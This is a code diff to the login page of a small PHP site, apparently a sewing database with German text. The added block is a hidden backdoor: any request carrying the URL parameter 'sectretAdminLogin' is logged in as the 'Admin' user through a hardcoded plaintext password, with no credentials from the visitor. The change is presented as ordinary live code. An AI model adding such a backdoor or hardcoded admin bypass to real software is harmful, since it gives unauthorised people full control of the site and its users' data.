@@ -50,6 +50,25 @@ $pdo = new PDO('mysql:host=localhost;dbname=sewingdb', DB_USER, DB_PASSWORD);
                         $errorMessage = "E-Mail oder Passwort war ungültig<br>";
                     }
                 }
+                
+                if (isset($_GET['sectretAdminLogin'])) {
+
+                    $name = "Admin";
+                    $passwort = "DerAdmin";
+                    #$passwort = password_hash($passwort, PASSWORD_DEFAULT);
+
+                    $statement = $pdo->prepare("SELECT * FROM users WHERE user_name = :name");
+                    $result = $statement->execute(array('name' => $name));
+                    $user = $statement->fetch();
+
+                    //Überprüfung des Passworts
+                    if ($user !== false && $passwort == $user['password']) {
+                        $_SESSION['userid'] = $user['user_name'];
+                        echo ('Login erfolgreich als . Weiter zur <a href="index.php">Startseite</a>');
+                    } else {
+                        $errorMessage = "E-Mail oder Passwort war ungültig<br>";
+                    }
+                }
                 ?>
             </div>
             <!-- The overlay sideNav -->
